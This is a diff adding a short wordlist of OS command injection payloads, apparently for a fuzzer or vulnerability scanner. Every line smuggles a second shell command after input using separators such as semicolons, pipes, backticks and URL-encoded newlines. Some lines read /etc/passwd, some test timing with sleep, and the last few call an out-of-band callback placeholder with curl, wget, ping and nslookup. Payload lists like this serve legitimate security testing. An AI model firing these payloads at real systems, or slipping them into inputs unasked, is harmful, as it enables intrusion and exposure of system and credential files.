@@ -1,0 +1,37 @@
+test;id
+test;id;
+test&&id
+test||id
+test|id
+test`id`
+test$(id)
+test;id%00
+test;sleep 5
+test;id;echo
+test|id|echo
+test&&id&&echo
+test||id||echo
+test\n id
+test%0a id
+test%0aid
+test%0aid%0a
+test%3bid
+test%7cid
+test%26%26id
+test`sleep 5`
+test$(sleep 5)
+test%60id%60
+test%24%28id%29
+test;cat /etc/passwd
+test;cat /etc/hosts
+test|cat /etc/passwd
+test&&cat /etc/passwd
+test;whoami
+test;pwd
+test;uname -a
+test;ls -la
+test;id;echo 'hi'
+test;curl http://INTERACTSH_URL/
+test;wget http://INTERACTSH_URL/
+test;ping -c 1 INTERACTSH_URL
+test;nslookup INTERACTSH_URL
